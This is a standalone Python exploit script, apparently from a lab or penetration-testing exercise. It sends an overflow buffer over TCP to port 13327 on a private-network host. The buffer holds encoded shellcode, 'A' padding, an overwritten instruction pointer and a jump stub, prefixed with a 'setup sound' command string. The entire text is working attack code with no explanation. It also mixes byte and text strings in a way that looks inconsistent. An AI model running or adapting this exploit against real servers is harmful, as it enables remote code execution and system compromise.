import socket

host = "192.168.190.151"
shellcode =  b""
shellcode += b"\xdd\xc3\xbd\xb2\xae\x21\x09\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x12\x83\xc0\x04\x31\x68\x13"
shellcode += b"\x03\xda\xbd\xc3\xfc\x2b\x19\xf4\x1c\x18\xde"
shellcode += b"\xa8\x88\x9c\x69\xaf\xfd\xc6\xa4\xb0\x6d\x5f"
shellcode += b"\x87\x8e\x5c\xdf\xae\x89\xa7\xb7\xf0\xc2\xe6"
shellcode += b"\xc2\x99\x10\x17\xcd\xe2\x9c\xf6\x7d\x72\xcf"
shellcode += b"\xa9\x2e\xc8\xec\xc0\x31\xe3\x73\x80\xd9\x92"
shellcode += b"\x5c\x56\x71\x03\x8c\xb7\xe3\xba\x5b\x24\xb1"
shellcode += b"\x6f\xd5\x4a\x85\x9b\x28\x0c"

padding = "\x41" * (4368 - len(shellcode))
eip = "\x96\x45\x13\x08" # 0x08134596
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + shellcode + padding + eip + first_stage + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")
s.connect((host, 13327))
print(s.recv(1024))
s.send(buffer)
s.close()
print("[*]Payload Sent !")